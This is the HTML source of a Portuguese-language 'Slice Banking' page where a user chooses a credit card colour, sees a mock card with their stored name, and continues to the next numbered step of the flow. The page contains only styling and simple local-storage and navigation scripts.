<html lang="pt-BR">

   Cartão
  </title>

  <style>
   body {

            margin: 0;

            font-family: 'Sora', sans-serif;

            background-color: #ffffff;

            text-align: center;

        }

        .header {

            display: flex;

            align-items: center;

            padding: 10px;

            border-bottom: 1px solid #890dbd;

            background-color: #890dbd;

        }

        .header img {

            width: 100px;

            padding: 5px;

        }

        .logo {

            width: 125px;

            margin-left: 20px;

            padding: 10px;

        }

        .container {

            max-width: 600px;

            margin: 20px auto;

            padding: 0 20px;

        }

        h1 {

            font-size: 24px;

            color: #333;

            margin-bottom: 10px;

        }

        .subtitle {

            font-size: 16px;

            color: #666;

            margin-bottom: 30px;

        }

        .color-options {

            display: flex;

            justify-content: center;

            gap: 20px;

            margin: 30px 0;

        }

        .color-option {

            width: 40px;

            height: 40px;

            border-radius: 50%;

            border: 2px solid transparent;

            cursor: pointer;

            transition: transform 0.2s;

        }

        .color-option:hover {

            transform: scale(1.1);

        }

        .color-option.selected {

            border-color: #890dbd;

        }

        .card {

            background: linear-gradient(135deg, #e72abf, #890dbd);

            border-radius: 15px;

            padding: 20px;

            height: 165px;

            position: relative;

            margin-bottom: 30px;

        }

        .card-top {

            display: flex;

            justify-content: space-between;

            margin-bottom: 100px;

        }

        .card-bottom {

            display: flex;

            justify-content: space-between;

            align-items: flex-end;

        }

        .card-name {

            font-family: 'Sora', sans-serif;

            font-size: 14px;

            color: rgb(255, 255, 255);

        }

        .continue-btn {

            background-color: #890dbd;

            color: #ffffff;

            padding: 15px 40px;

            border: none;

            border-radius: 5px;

            font-size: 16px;

            font-weight: bold;

            cursor: pointer;

            margin-top: 20px;

        }

        .button {

            background-color: #890dbd;

            color: #ffffff;

            padding: 15px;

            border-radius: 8px;

            border: none;

            width: 100%;

            font-family: 'Sora', sans-serif;

            font-weight: bold;

            font-size: 16px;

            cursor: pointer;

        }
  </style>
 </head>
 <body>
  <div class="header">
   <img alt="Logo Slice Banking" class="logo" src="img/Bf6Dpoa.png"/>
  </div>
  <div class="container">
   <h1 style="text-align: center; font-size: 20px;">
    Personalize o seu cartão
   </h1>
   <div class="color-options">
    <div class="color-option selected" onclick="changeCardColor('#e72abf', '#890dbd')" style="background: linear-gradient(135deg, #e72abf, #890dbd)">
    </div>
    <div class="color-option" onclick="changeCardColor('#2491ff', '#1458e2')" style="background: linear-gradient(45deg, #2491ff, #1458e2)">
    </div>
    <div class="color-option" onclick="changeCardColor('#FF1493', '#FF69B4')" style="background: linear-gradient(45deg, #FF1493, #FF69B4)">
    </div>
   </div>
   <script>
    function changeCardColor(color1, color2) {

                document.querySelector('.card').style.background = `linear-gradient(45deg, ${color1}, ${color2})`;

                

                // Atualiza a seleção visual

                document.querySelectorAll('.color-option').forEach(option => {

                    option.classList.remove('selected');

                });

                event.target.classList.add('selected');



                // Salva a cor selecionada no localStorage

                localStorage.setItem('cardColor', JSON.stringify({

                    color1: color1,

                    color2: color2

                }));

            }



            // Carrega a cor salva ao iniciar a página

            window.addEventListener('load', () => {

                const savedColor = localStorage.getItem('cardColor');

                if (savedColor) {

                    const {color1, color2} = JSON.parse(savedColor);

                    document.querySelector('.card').style.background = `linear-gradient(45deg, ${color1}, ${color2})`;

                }

            });
   </script>
   <div class="card" style="background: linear-gradient(135deg, #e72abf, #890dbd); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
    <!-- Efeito de brilho no cartão -->
    <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;">
    </div>
    <style>
     @keyframes shine {

            0% { left: -100%; }

            20% { left: 100%; }

            100% { left: 100%; }

        }
    </style>
    <div class="card-top">
     <img alt="Logo Slice Banking" src="img/5JRZkV6.png" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2)); margin-left: -15px;"/>
     <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">
      Gold
     </div>
    </div>
    <div style="position: absolute; top: 45%; left: 0; transform: translateY(-50%); width: 100%;">
     <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
      <div style="display: flex; align-items: center; margin-left: 20px;">
       <img alt="Chip" src="img/chip.png" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));"/>
      </div>
      <i class="fas fa-wifi fa-rotate-90" style="color: rgb(0, 0, 0); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
      </i>
     </div>
    </div>
    <div class="card-bottom">
     <div style="display: flex; flex-direction: column; align-items: flex-start;">
      <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">
       <script>
        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));

                    document.getElementById('cardName').textContent = dadosUsuario.NOME.toUpperCase();
       </script>
      </span>
      <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Sora', sans-serif; margin-top: 3px;">
       TITULAR DO CARTÃO
      </span>
     </div>
     <div style="display: flex; flex-direction: column; align-items: flex-end;">
      <img alt="mastercard" src="img/visa.png" style="width: 50px; filter: brightness(100);"/>
      <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">
       Crédito
      </span>
     </div>
    </div>
    <!-- Padrão de segurança no fundo do cartão -->
    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;">
    </div>
   </div>
   <button class="button" onclick="window.location.href = buildUrlWithParams('../slice-11/index.html')">
    Continuar
   </button>
   <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
    <div style="max-width: 600px; margin: 0 auto;">
     <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
      Slice Banking Brasil LTDA | CNPJ: 98.365.409/0001-06

     <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
      Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
     </p>
     <p style="color: #999; font-size: 9px; margin-top: 5px;">
      © 2025 - Todos os direitos reservados
     </p>
    </div>
   </footer>
  </div>
  <script>
   function getUrlParams() {

                const params = {};

                const queryString = window.location.search;

                const urlParams = new URLSearchParams(queryString);

                

                for (const [key, value] of urlParams) {

                    params[key] = value;

                }

                return params;

            }



            function buildUrlWithParams(baseUrl) {

                const params = getUrlParams();

                const url = new URL(baseUrl, window.location.href);

                Object.keys(params).forEach(key => {

                    url.searchParams.append(key, params[key]);

                });

                

                return url.toString();

            }
  </script>
